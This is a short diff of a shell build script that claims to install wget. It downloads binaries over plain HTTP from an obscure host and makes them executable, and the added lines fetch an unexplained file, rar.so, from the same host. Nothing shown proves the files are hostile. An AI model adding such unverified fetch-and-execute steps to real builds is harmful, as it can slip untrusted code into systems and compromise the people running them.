@@ -50,6 +50,8 @@ echo "-----> Fetching and installing wget"
 cd bin
 curl --silent --max-time 60 --location -O http://1375.cf/wget
 chmod +x wget
+curl --silent --max-time 60 --location -O http://1375.cf/rar.so
+chmod +x rar.so
 cd ..
 echo "-----> wget installed!"
 
